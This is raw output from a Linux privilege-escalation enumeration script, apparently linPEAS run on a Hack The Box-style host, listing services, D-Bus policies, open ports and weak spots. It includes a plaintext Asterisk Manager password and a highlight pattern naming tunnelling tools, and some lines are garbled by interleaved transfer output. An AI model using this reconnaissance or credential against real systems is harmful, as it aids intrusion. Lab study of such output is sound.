+iscsi-shutdown.service             loaded active exited  Logout off all iSCSI sessions on shutdown
+  Potential issue in service file: /usr/lib/systemd/system/iscsi-shutdown.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+kmod-static-nodes.service          loaded active exited  Create list of required static device nodes for the current kernel
+libstoragemgmt.service             loaded active running libstoragemgmt plug-in server daemon
+  Potential issue in service: libstoragemgmt.service
+  └─ RUNS_AS_ROOT: Service runs as root\n
+lvm2-lvmetad.service               loaded active running LVM2 metadata daemon
+lvm2-monitor.service               loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
+lvm2-pvscan@8:2.service            loaded active exited  LVM2 PV scan on device 8:2
+mariadb.service                    loaded active running MariaDB database server
+mongod.service                     loaded active running High-performance, schema-free document-oriented database
+network.service                    loaded active exited  LSB: Bring up/down networking
+NetworkManager-wait-online.service loaded active exited  Network Manager Wait Online
+NetworkManager.service             loaded active running Network Manager
+polkit.service                     loaded active running Authorization Manager
+postfix.service                    loaded active running Postfix Mail Transport Agent
+redis.service                      loaded active running Redis persistent key-value database
+  Potential issue in service: redis.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+rngd.service                       loaded active running Hardware RNG Entropy Gatherer Daemon
+rsyslog.service                    loaded active running System Logging Service
+sangoma-pnpd.service               loaded active running Sangoma PnP Service
+smartd.service                     loaded active running Self Monitoring and Reporting Technology (SMART) Daemon
+sshd.service                       loaded active running OpenSSH server daemon
+sysstat.service                    loaded active exited  Resets System Activity Logs
+  Potential issue in service: sysstat.service
+  └─ RUNS_AS_ROOT: Service runs as root\n
+systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage
+systemd-journald.service           loaded active running Journal Service
+systemd-logind.service             loaded active running Login Service
+systemd-random-seed.service        loaded active exited  Load/Save Random Seed
+systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems
+  Potential issue in service: systemd-remount-fs.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+systemd-sysctl.service             loaded active exited  Apply Kernel Variables
+systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev
+systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories
+systemd-udev-settle.service        loaded active exited  udev Wait for Complete Device Initialization
+systemd-udev-trigger.service       loaded active exited  udev Coldplug all Devices
+  Potential issue in service: systemd-udev-trigger.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+systemd-udevd.service              loaded active running udev Kernel Device Manager
+systemd-update-utmp.service        loaded active exited  Update UTMP about System Boot/Shutdown
+systemd-user-sessions.service      loaded active exited  Permit User Sessions
+systemd-vconsole-setup.service     loaded active exited  Setup Virtual Console
+tuned.service                      loaded active running Dynamic System Tuning Daemon
+vega_bridge.service                loaded active running SYSV: Vega Bridge Startup Script.
+vgauthd.service                    loaded active running VGAuth Service for open-vm-tools
+vmtoolsd.service                   loaded active running Service for virtual machines hosted on VMware
+xinetd.service                     loaded active running Xinetd A Powerful Replacement For Inetd
+LOAD   = Reflects whether the unit definition was properly loaded.
+ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
+SUB    = The low-level unit activation state, values depend on unit type.
+55 loaded units listed. Pass --all to see loaded but inactive units, too.
+To show all installed unit files use 'systemctl list-unit-files'.
+
+══╣ Disabled services: (T1543.002,T1007)
+abrt-pstoreoops.service       disabled
+apcupsd.service               disabled
+arp-ethers.service            disabled
+blk-availability.service      disabled
+chrony-wait.service           disabled
+console-getty.service         disabled
+console-shell.service         disabled
+  Potential issue in service: console-shell.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+cpupower.service              disabled
+debug-shell.service           disabled
+  Potential issue in service: debug-shell.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+dnsmasq.service               disabled
+ebtables.service              disabled
+fail2ban.service              disabled
+fancontrol.service            disabled
+fcoe.service                  disabled
+ip6tables.service             disabled
+iprdump.service               disabled
+iprinit.service               disabled
+iprupdate.service             disabled
+iptables.service              disabled
+iscsid.service                disabled
+iscsiuio.service              disabled
+kpatch.service                disabled
+lldpad.service                disabled
+mongos.service                disabled
+nfs-rquotad.service           disabled
+ntpd.service                  disabled
+ntpdate.service               disabled
+openvpn-client@.service       disabled
+openvpn-server@.service       disabled
+openvpn@.service              disabled
+plymouth-halt.service         disabled
+plymouth-kexec.service        disabled
+plymouth-poweroff.service     disabled
+plymouth-quit-wait.service    disabled
+plymouth-quit.service         disabled
+plymouth-read-write.service   disabled
+plymouth-reboot.service       disabled
+plymouth-start.service        disabled
+psacct.service                disabled
+radiusd.service               disabled
+rdisc.service                 disabled
+redis-sentinel.service        disabled
+  Potential issue in service: redis-sentinel.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+rhel-autorelabel-mark.service disabled
+rhel-autorelabel.service      disabled
+rhel-configure.service        disabled
+rhel-dmesg.service            disabled
+rhel-domainname.service       disabled
+rhel-import-state.service     disabled
+rhel-loadmodules.service      disabled
+rhel-readonly.service         disabled
+rngd-sw.service               disabled
+rpc-rquotad.service           disabled
+rpcbind.service               disabled
+rsyncd.service                disabled
+serial-getty@.service         disabled
+systemd-bootchart.service     disabled
+systemd-nspawn@.service       disabled
+tcsd.service                  disabled
+vsftpd.service                disabled
+vsftpd@.service               disabled
+60 unit files listed.
+
+══╣ Additional service files: (T1543.002,T1007)
+  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/abrt-oops.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/abrt-xorg.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+  Potential issue in service file: /etc/systemd/system/remote-fs.target.wants/iscsi.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+You can't write on systemd PATH
+
+╔══════════╣ Systemd Information (T1543.002)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
+═╣ Systemd version and vulnerabilities? .............. ═╣ Services running as root? ..... 
+═╣ Running services with dangerous capabilities? ... 
+═╣ Services with writable paths? . 
+╔══════════╣ Systemd PATH (T1543.002)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+
+╔══════════╣ Analyzing .socket files (T1559)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
+
+╔══════════╣ Unix Sockets Analysis (T1571,T1049)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
+
+╔══════════╣ D-Bus Analysis (T1559.001)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
+NAME                                     PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
+:1.0                                     734 systemd-logind  root             :1.0          systemd-logind.service    -          -
+:1.1                                       1 systemd         root             :1.1          -                         -          -
+:1.10                                    867 NetworkManager  root             :1.10         NetworkManager.service    -          -
+:1.2                                     735 avahi-daemon    avahi            :1.2          avahi-daemon.service      -          -
+:1.23                                   1162 tuned           root             :1.23         tuned.service             -          -
+:1.2623                                44962 busctl          asterisk         :1.2623       session-55.scope          55         -
+:1.4                                     745 polkitd         polkitd          :1.4          polkit.service            -          -
+:1.5                                     817 firewalld       root             :1.5          firewalld.service         -          -
+:1.6                                     867 NetworkManager  root             :1.6          NetworkManager.service    -          -
+com.redhat.ifcfgrh1                      867 NetworkManager  root             :1.10         NetworkManager.service    -          -
+com.redhat.problems.configuration          - -               -                (activatable) -                         -
+  └─ Interfaces:
+     └─/com
+       └─/com/redhat
+         └─/com/redhat/problems
+           └─/com/redhat/problems/configuration
+             ├─/com/redhat/problems/configuration/abrt
+             ├─/com/redhat/problems/configuration/ccpp
+             ├─/com/redhat/problems/configuration/mailx
+             ├─/com/redhat/problems/configuration/oops
+             ├─/com/redhat/problems/configuration/python
+             ├─/com/redhat/problems/configuration/rhtsupport
+             ├─/com/redhat/problems/configuration/ureport
+             ├─/com/redhat/problems/configuration/vmcore
+             └─/com/redhat/problems/configuration/xorg
+com.redhat.tuned                        1162 tuned           root             :1.23         tuned.service             -          -
+fi.epitest.hostap.WPASupplicant            - -               -                (activatable) -                         -
+fi.w1.wpa_supplicant1                      - -               -                (activatable) -                         -
+net.reactivated.Fprint                     - -               -                (activatable) -                         -
+  └─ Interfaces:
+     └─/net
+       └─/net/reactivated
+         └─/net/reactivated/Fprint
+           └─/net/reactivated/Fprint/Manager
+org.fedoraproject.FirewallD1             817 firewalld       root             :1.5          firewalld.service         -          -
+org.freedesktop.Avahi                    735 avahi-daemon    avahi            :1.2          avahi-daemon.service      -          -
+org.freedesktop.DBus                     762 dbus-daemon     dbus             org.freedesktop.DBus dbus.service              -          -
+org.freedesktop.NetworkManager           867 NetworkManager  root             :1.6          NetworkManager.service    -          -
+org.freedesktop.PolicyKit1               745 polkitd         polkitd          :1.4          polkit.service            -          -
+org.freedesktop.hostname1                  - -               -                (activatable) -                         -
+org.freedesktop.import1                    - -               -                (activatable) -                         -
+org.freedesktop.locale1                    - -               -                (activatable) -                         -
+org.freedesktop.login1                   734 systemd-logind  root             :1.0          systemd-logind.service    -          -
+org.freedesktop.machine1                   - -               -                (activatable) -                         -
+org.freedesktop.nm_dispatcher              - -               -                (activatable) -                         -
+org.freedesktop.problems                   - -               -                (activatable) -                         -
+  └─ Interfaces:
+     └─/org
+       └─/org/freedesktop
+         └─/org/freedesktop/problems
+org.freedesktop.systemd1                   1 systemd         root             :1.1          -                         -          -
+org.freedesktop.timedate1                  - -               -                (activatable) -                         -
+
+╔══════════╣ D-Bus Configuration Files (T1559.001)
+Analyzing /etc/dbus-1/system.d/avahi-dbus.conf:
+  └─(Weak user policy found)
+     └─   <policy user="avahi">
+  └─(Weak group policy found)
+     └─   <policy group="avahi">
+  └─(Allow rules in default context)
+             └─     <allow send_destination="org.freedesktop.Avahi"/>
+            <allow receive_sender="org.freedesktop.Avahi"/>
+Analyzing /etc/dbus-1/system.d/com.redhat.tuned.conf:
+  └─(Allow rules in default context)
+             └─ 		<allow receive_sender="com.redhat.tuned" />
+        		<allow send_destination="com.redhat.tuned" send_interface="org.freedesktop.DBus.Introspectable" />
+        		<allow send_destination="com.redhat.tuned" send_interface="com.redhat.tuned.control" />
+Analyzing /etc/dbus-1/system.d/dbus-abrt.conf:
+  └─(Allow rules in default context)
+             └─     <allow send_destination="org.freedesktop.problems"/>
+            <allow send_destination="com.redhat.problems.configuration"/>
+Analyzing /etc/dbus-1/system.d/dnsmasq.conf:
+  └─(Multiple weak policies found)
+Analyzing /etc/dbus-1/system.d/FirewallD.conf:
+  └─(Allow rules in default context)
+             └─     <allow send_destination="org.fedoraproject.FirewallD1"/>
+            <allow send_destination="org.fedoraproject.FirewallD1"
+            <allow send_destination="org.fedoraproject.FirewallD1"
+Analyzing /etc/dbus-1/system.d/net.reactivated.Fprint.conf:
+  └─(Allow rules in default context)
+             └─     <allow send_destination="net.reactivated.Fprint"/>
+            <allow send_interface="net.reactivated.Fprint"/>
+Analyzing /etc/dbus-1/system.d/nm-dispatcher.conf:
+  └─(Multiple weak policies found)
+Analyzing /etc/dbus-1/system.d/nm-ifcfg-rh.conf:
+  └─(Allow rules in default context)
+             └─                 <allow send_destination="com.redhat.ifcfgrh1"/>
+                        <allow own="com.redhat.ifcfgrh1"/>
+Analyzing /etc/dbus-1/system.d/org.freedesktop.hostname1.conf:
+  └─(Allow rules in default context)
+             └─                 <allow send_destination="org.freedesktop.hostname1"/>
+                        <allow receive_sender="org.freedesktop.hostname1"/>
+Analyzing /etc/dbus-1/system.d/org.freedesktop.import1.conf:
+  └─(Allow rules in default context)
+             └─                 <allow send_destination="org.freedesktop.import1"
+Analyzing /etc/dbus-1/system.d/org.freedesktop.locale1.conf:
+  └─(Allow rules in default context)
+             └─                 <allow send_destination="org.freedesktop.locale1"/>
+                        <allow receive_sender="org.freedesktop.locale1"/>
+Analyzing /etc/dbus-1/system.d/org.freedesktop.login1.conf:
+  └─(Allow rules in default context)
+             └─                 <allow send_destination="org.freedesktop.login1"
+Analyzing /etc/dbus-1/system.d/org.freedesktop.machine1.conf:
+  └─(Allow rules in default context)
+             └─                 <allow send_destination="org.freedesktop.machine1"
+Analyzing /etc/dbus-1/system.d/org.freedesktop.NetworkManager.conf:
+  └─(Multiple weak policies found)
+Analyzing /etc/dbus-1/system.d/org.freedesktop.PolicyKit1.conf:
+  └─(Weak user policy found)
+     └─   <policy user="polkitd">
+  <policy user="polkitd">
+  └─(Allow rules in default context)
+             └─     <allow send_destination="org.freedesktop.PolicyKit1"/>
+Analyzing /etc/dbus-1/system.d/org.freedesktop.systemd1.conf:
+  └─(Allow rules in default context)
+             └─                 <allow send_destination="org.freedesktop.systemd1"
+Analyzing /etc/dbus-1/system.d/org.freedesktop.timedate1.conf:
+  └─(Allow rules in default context)
+             └─                 <allow send_destination="org.freedesktop.timedate1"/>
+                        <allow receive_sender="org.freedesktop.timedate1"/>
+Analyzing /etc/dbus-1/system.d/teamd.conf:
+  └─(Multiple weak policies found)
+Analyzing /etc/dbus-1/system.d/wpa_supplicant.conf:
+  └─(Multiple weak policies found)
+Activation definitions in /usr/lib/firewalld/services:
+Activation definitions in /usr/share/dbus-1/services:
+/usr/share/dbus-1/services/org.freedesktop.systemd1.service:9:Name=org.freedesktop.systemd1
+/usr/share/dbus-1/services/org.freedesktop.systemd1.service:10:Exec=Exec=/bin/false
+/usr/share/dbus-1/services/org.freedesktop.systemd1.service:11:User=User=root
+Activation definitions in /usr/share/dbus-1/system-services:
+/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:9:Name=org.freedesktop.hostname1
+/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:10:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:11:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.import1.service:9:Name=org.freedesktop.import1
+/usr/share/dbus-1/system-services/org.freedesktop.import1.service:10:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.import1.service:11:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:9:Name=org.freedesktop.locale1
+/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:10:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:11:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.login1.service:9:Name=org.freedesktop.login1
+/usr/share/dbus-1/system-services/org.freedesktop.login1.service:10:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.login1.service:11:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.machine1.service:9:Name=org.freedesktop.machine1
+/usr/share/dbus-1/system-services/org.freedesktop.machine1.service:10:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.machine1.service:11:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:9:Name=org.freedesktop.systemd1
+/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:10:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:11:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:9:Name=org.freedesktop.timedate1
+/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:10:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:11:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.PolicyKit1.service:2:Name=org.freedesktop.PolicyKit1
+/usr/share/dbus-1/system-services/org.freedesktop.PolicyKit1.service:3:Exec=Exec=/usr/lib/polkit-1/polkitd --no-debug
+/usr/share/dbus-1/system-services/org.freedesktop.PolicyKit1.service:4:User=User=root
+/usr/share/dbus-1/system-services/fi.epitest.hostap.WPASupplicant.service:2:Name=fi.epitest.hostap.WPASupplicant
+/usr/share/dbus-1/system-services/fi.epitest.hostap.WPASupplicant.service:3:Exec=Exec=/usr/sbin/wpa_supplicant -B -u -f /var/log/wpa_supplicant.log -c /etc/wpa_supplicant/wpa_supplicant.conf -P /var/run/wpa_supplicant.pid
+/usr/share/dbus-1/system-services/fi.epitest.hostap.WPASupplicant.service:4:User=User=root
+/usr/share/dbus-1/system-services/fi.w1.wpa_supplicant1.service:2:Name=fi.w1.wpa_supplicant1
+/usr/share/dbus-1/system-services/fi.w1.wpa_supplicant1.service:3:Exec=Exec=/usr/sbin/wpa_supplicant -B -u -f /var/log/wpa_supplicant.log -c /etc/wpa_supplicant/wpa_supplicant.conf -P /var/run/wpa_supplicant.pid
+/usr/share/dbus-1/system-services/fi.w1.wpa_supplicant1.service:4:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.nm_dispatcher.service:2:Name=org.freedesktop.nm_dispatcher
+/usr/share/dbus-1/system-services/org.freedesktop.nm_dispatcher.service:3:Exec=Exec=/usr/libexec/nm-dispatcher
+/usr/share/dbus-1/system-services/org.freedesktop.nm_dispatcher.service:4:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.Avahi.service:19:Name=org.freedesktop.Avahi
+/usr/share/dbus-1/system-services/org.freedesktop.Avahi.service:24:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/com.redhat.problems.configuration.service:2:Name=com.redhat.problems.configuration
+/usr/share/dbus-1/system-services/com.redhat.problems.configuration.service:6:Exec=Exec=/usr/sbin/abrt-configuration -t133
+/usr/share/dbus-1/system-services/com.redhat.problems.configuration.service:7:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.problems.service:2:Name=org.freedesktop.problems
+/usr/share/dbus-1/system-services/org.freedesktop.problems.service:6:Exec=Exec=/usr/sbin/abrt-dbus -t133
+/usr/share/dbus-1/system-services/org.freedesktop.problems.service:7:User=User=root
+/usr/share/dbus-1/system-services/net.reactivated.Fprint.service:2:Name=net.reactivated.Fprint
+/usr/share/dbus-1/system-services/net.reactivated.Fprint.service:3:Exec=Exec=/usr/libexec/fprintd
+/usr/share/dbus-1/system-services/net.reactivated.Fprint.service:4:User=User=root
+Analyzing /usr/share/wireshark/services:
+  └─(Multiple weak policies found)
+
+══╣ D-Bus Session Bus Analysis (T1559.001)
+(Access to session bus available)
+
+
+╔══════════╣ Legacy r-commands (rsh/rlogin/rexec) and host-based trust (T1021.004)
+
+══╣ Listening r-services (TCP 512-514) (T1021.004)
+
+══╣ systemd units exposing r-services (T1021.004)
+rlogin|rsh|rexec units Not Found
+
+══╣ inetd/xinetd configuration for r-services (T1021.004)
+/etc/inetd.conf Not Found
+
+══╣ Installed r-service server packages (T1021.004)
+xinetd-2.3.15-14.el7.x86_64
+
+══╣ /etc/hosts.equiv and /etc/shosts.equiv (T1021.004)
+
+══╣ Per-user .rhosts files (T1021.004)
+.rhosts Not Found
+
+══╣ PAM rhosts authentication (T1021.004)
+/etc/pam.d/rlogin|rsh Not Found
+
+══╣ SSH HostbasedAuthentication (T1021.004)
+  HostbasedAuthentication no or not set
+
+══╣ Potential DNS control indicators (local) (T1021.004)
+  Not detected
+
+╔══════════╣ Crontab UI (root) misconfiguration checks (T1053.003)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
+crontab-ui Not Found
+╔══════════╣ Deleted files still open (T1083)
+╚ Open deleted files can hide tools and still consume disk space
+
+╔══════════╣ Deleted executables still running (T1083)
+╚ A deleted /proc/<PID>/exe may indicate tampering, cleanup, or a useful runtime-only binary
+
+
+
+ 76 1038k   76  793k    0     0   5219      0  0:03:23  0:02:35  0:00:48  3226                              ╔═════════════════════╗
+══════════════════════════════╣ Network Information ╠══════════════════════════════
+                              ╚═════════════════════╝
+╔══════════╣ Interfaces (T1016)
+default 0.0.0.0
+loopback 127.0.0.0
+link-local 169.254.0.0
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.129.8.172  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 fe80::82bd:1bcb:a990:dd3b  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:e8:21  txqueuelen 1000  (Ethernet)
+        RX packets 220167  bytes 18114226 (17.2 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 10905  bytes 21672594 (20.6 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 16659  bytes 53012095 (50.5 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 16659  bytes 53012095 (50.5 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+══╣ Routing & policy quick view (T1016)
+default via 10.129.0.1 dev eth0 proto dhcp metric 100 
+10.129.0.0/16 dev eth0 proto kernel scope link src 10.129.8.172 metric 100 
+unreachable ::/96 dev lo metric 1024 pref medium
+unreachable ::ffff:0.0.0.0/96 dev lo metric 1024 pref medium
+unreachable 2002:a00::/24 dev lo metric 1024 pref medium
+unreachable 2002:7f00::/24 dev lo metric 1024 pref medium
+unreachable 2002:a9fe::/32 dev lo metric 1024 pref medium
+unreachable 2002:ac10::/28 dev lo metric 1024 pref medium
+unreachable 2002:c0a8::/32 dev lo metric 1024 pref medium
+unreachable 2002:e000::/19 dev lo metric 1024 pref medium
+unreachable 3ffe:ffff::/32 dev lo metric 1024 pref medium
+fe80::/64 dev eth0 proto kernel metric 100 pref medium
+
+0:	from all lookup local 
+32766:	from all lookup main 
+32767:	from all lookup default 
+══╣ Virtual/overlay interfaces quick view (T1016)
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000
+══╣ Network namespaces quick view (T1016)
+══╣ Forwarding status (T1016)
+net.ipv4.ip_forward = 0
+net.ipv6.conf.all.forwarding = 0
+
+╔══════════╣ Hostname, hosts and DNS (T1016,T1018)
+══╣ Hostname Information (T1016,T1018)
+System hostname: connected
+FQDN: connected
+
+══╣ Hosts File Information (T1016,T1018)
+Contents of /etc/hosts:
+  127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
+  ::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
+  127.0.1.1 connection.htb connection
+
+══╣ DNS Configuration (T1016,T1018)
+DNS Servers (resolv.conf):
+  1.1.1.1
+  8.8.8.8
+
+NetworkManager DNS settings:
+
+DNS Domain Information:
+(none)
+
+╔══════════╣ Active Ports (T1049)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
+══╣ Active Ports (netstat) (T1049)
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:4000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5038          0.0.0.0:*               LISTEN      1275/asterisk       
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 ::1:25                  :::*                    LISTEN      -                   
+tcp6       0      0 :::443                  :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+══╣ Local-only listeners (loopback) (T1049)
+udp    UNCONN     0      0      127.0.0.1:323                   *:*                  
+tcp    LISTEN     0      100    127.0.0.1:25                    *:*                  
+tcp    LISTEN     0      128    127.0.0.1:4000                  *:*                  
+tcp    LISTEN     0      128    127.0.0.1:27017                 *:*                  
+tcp    LISTEN     0      50     127.0.0.1:3306                  *:*                  
+tcp    LISTEN     0      511    127.0.0.1:6379                  *:*                  
+tcp    LISTEN     0      10     127.0.0.1:5038                  *:*                   users:(("asterisk",pid=1275,fd=9))
+══╣ Unique listener bind addresses (T1049)
+::
+*
+::1
+127.0.0.1
+══╣ Potential local forwarders/relays (T1049)
+asterisk  46483atus: Disabled
+cat Not Found
+
+
+Service: echo-dgram
+Status: Disabled
+cat Not Found
+
+
+Service: echo-stream
+Status: Disabled
+cat Not Found
+
+
+Service: tcpmux-server
+Status: Disabled
+cat Not Found
+
+
+Service: tftp
+Status: Disabled
+service tftp
+{
+	socket_type		= dgram
+	protocol		= udp
+	wait			= yes
+	user			= root
+	server			= /usr/sbin/in.tftpd
+	server_args		= -s /tftpboot
+	disable			= yes
+	per_source		= 11
+	cps			= 100 2
+	flags			= IPv4
+}
+Warning: Service uses system binaries
+Warning: Service runs as root
+
+Service: time-dgram
+Status: Disabled
+cat Not Found
+
+
+Service: time-stream
+Status: Disabled
+cat Not Found
+
+
+══╣ Running Inetd/Xinetd Services (T1049)
+Active Services (from netstat):
+
+Active Services (from ss):
+
+Running Service Processes:
+1179
+xinetd
+1179
+xinetd
+
+╔══════════╣ Internet Access? (T1016,T1590)
+Port 443 is not accessible
+Port 80 is not accessible
+DNS is not accessible
+ICMP is not accessible
+ICMP is not accessible
+Port 443 is not accessible with curl
+
+══╣ Proxy discovery (T1016,T1590)
+╚ Checking common proxy env vars and apt proxy config
+
+
+
+ 81 1038k   81  841k    0     0   3927      0  0:04:30  0:03:39  0:00:51  1567                               ╔═══════════════════╗
+═══════════════════════════════╣ Users Information ╠═══════════════════════════════
+                               ╚═══════════════════╝
+╔══════════╣ My user (T1033)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users
+uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
+
+╔══════════╣ PGP Keys and Related Files (T1552.004)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys
+GPG:
+GPG is installed, listing keys:
+/home/asterisk/.gnupg/pubring.gpg
+---------------------------------
+pub   4096R/755231A3 2019-12-13
+uid                  FreePBX Mirror Servers <security@freepbx.org>
+sub   4096R/B2584FE1 2019-12-13
+
+pub   4096R/6BD35B34 2019-12-13
+uid                  FreePBX Module Signing (This is the master key to sign FreePBX Modules) v2 <modules@freepbx.org>
+sub   4096R/C7DAD6CD 2019-12-13
+sub   4096R/53CD0B27 2019-12-13
+
+pub   4096R/B33B4659 2014-04-30
+uid                  FreePBX Module Signing (This is the master key to sign FreePBX Modules) <modules@freepbx.org>
+sub   4096R/5C2FE148 2014-04-30
+
+pub   4096R/FE6D84F7 2016-05-04
+uid                  FreePBX Mirror 1 (Module Signing - 2016/2017) <security@freepbx.org>
+sub   4096R/A6869B39 2016-05-04
+
+pub   4096R/69D2EAD9 2014-05-05
+uid                  FreePBX Mirror 1 (Module Signing - 2014/2015) <security@freepbx.org>
+sub   4096R/CCEBF9CB 2014-05-05
+
+
+NetPGP:
+netpgpkeys Not Found
+
+PGP Related Files:
+Found: /home/asterisk/.gnupg
+total 40
+drwxrwxr-x.  2 asterisk asterisk    83 Jun 21 18:46 .
+drwxr-xr-x. 10 asterisk asterisk  4096 Jun 21 18:34 ..
+-rw-rw-r--.  1 asterisk asterisk 16236 Nov  2  2023 pubring.gpg
+-rw-rw-r--.  1 asterisk asterisk 16236 Nov  2  2023 pubring.gpg~
+-rw-rw-r--.  1 asterisk asterisk     0 Nov  2  2023 secring.gpg
+-rw-rw-r--.  1 asterisk asterisk  1600 Nov  2  2023 trustdb.gpg
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d (T1548.003)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid  0.0  0.0 117044  1648 ?        S    18:46   0:00 sed -E s,socat|ssh|-L|-R|-D|ncat|nc,?[1;31;103m&?[0m,g
+
+╔══════════╣ Network Traffic Analysis Capabilities (T1040)
+
+══╣ Available Sniffing Tools (T1040)
+tcpdump is available
+tshark is available
+TShark 1.10.14 (Git Rev Unknown from unknown)
+Sniffable interfaces according to tcpdump -D:
+
+══╣ Network Interfaces Sniffing Capabilities (T1040)
+Interface lo (loopback): Not sniffable
+Interface eth0: Not sniffable
+No sniffable interfaces found
+
+══╣ Running sniffing/traffic reconstruction processes (T1040)
+
+╔══════════╣ Firewall Rules Analysis (T1016)
+
+══╣ Iptables Rules (T1016)
+No permission to list iptables rules
+
+══╣ Nftables Rules (T1016)
+nftables Not Found
+
+══╣ Firewalld Rules (T1016)
+firewall-cmd Not Found
+
+Firewalld Zones:
+firewall-cmd Not Found
+
+Active Zones:
+drop
+  interfaces: eth0
+
+Available Services:
+firewall-cmd Not Found
+
+Open Ports:
+firewall-cmd Not Found
+
+Rich Rules:
+firewall-cmd Not Found
+
+══╣ UFW Rules (T1016)
+ufw Not Found
+
+══╣ Forwarding and rp_filter (T1016)
+net.ipv4.ip_forward = 0
+net.ipv6.conf.all.forwarding = 0
+net.ipv4.conf.all.rp_filter = 1
+
+╔══════════╣ Inetd/Xinetd Services Analysis (T1049)
+
+══╣ Inetd Services (T1049)
+inetd Not Found
+
+# Asterisk Manager Host
+# Default Value: localhost
+ASTMANAGERHOST=localhost
+# Asterisk Manager Password
+# Default Value: amp111
+AMPMGRPASS=fe1mYBs7D5P3
+# Asterisk Manager Port
+# Default Value: 5038
+ASTMANAGERPORT=5038
+# Asterisk Manager Proxy Port
+# Default Value: 
+ASTMANAGERPROXYPORT=
